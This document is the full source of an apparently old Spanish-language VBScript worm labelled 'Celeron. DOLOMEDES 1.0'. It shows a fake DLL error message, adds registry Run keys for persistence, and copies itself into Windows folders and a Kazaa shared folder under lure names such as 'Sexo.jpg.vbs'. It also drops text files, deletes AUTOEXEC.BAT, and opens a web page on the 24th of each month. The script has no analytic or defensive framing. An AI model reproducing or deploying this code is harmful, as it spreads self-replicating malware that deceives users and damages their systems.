   MsgBox "Kenrell32.dll not found",16,"Error 2003"
   On Error Resume Next
   RegeditCrear()

   Sub RegeditCrear()
   Dim Rege
   Set Rege = WScript.CreateObject("WScript.Shell")
   Rege.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Run","C:\WINDOWS\system32\Ken32.vbs"
   Rege.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Windll","C:\WINDOWS\system\Scrip.txt.vbs"
   end Sub
   On Error Resume Next

   Copiarasimismo()

   Sub Copiarasimismo()
   dim fso, eq, ctr, file, vbscopy
   Set fso = CreateObject("Scripting.FileSystemObject")
   set file = fso.OpenTextFile(WScript.ScriptFullname,1)
   vbscopy=file.ReadAll
   Set c = fso.GetFile(WScript.ScriptFullName)
   c.Copy("C:\WINDOWS\system32\Ken32.vbs")
   c.Copy("C:\WINDOWS\system\Scrip.txt.vbs")
   c.Copy("C:\WINDOWS\Prueba.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Cristina.jpg.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Lesbianas.jpg.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Sexo.jpg.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Video porno.jpg.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Anal.jpg.vbs")
   c.Copy("C:\Program Files\Kazaa\My Shared Folder\Britney.jpg.vbs")
   end sub
   On Error Resume Next
   Dim fso, f1, tf, fldr, s, op
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set tf = fso.CreateTextFile("C:\Documents and Settings\Owner\Desktop\CELERON_VIVE.txt", True)
   tf.WriteLine("Celeron. DOLOMEDES 1.0")
   tf.WriteBlankLines(3)
   tf.Write ("YO SOY UNA FORMA DE VIDA")
   tf.Close
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set tf = fso.CreateTextFile("C:\CELERON_VIVE.txt", True)
   tf.WriteLine("Celeron. DOLOMEDES 1.0")
   tf.WriteBlankLines(3)
   tf.Write ("YO SOY UNA FORMA DE VIDA")
   tf.Close
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set f1 = fso.GetFile("c:\AUTOEXEC.BAT")
   f1.Delete
   If Day(Now()) = 24 Then Set op= CreateObject("WScript.Shell")
   op.Run " http://www.geocities.com/lasprims/Fotos.html"
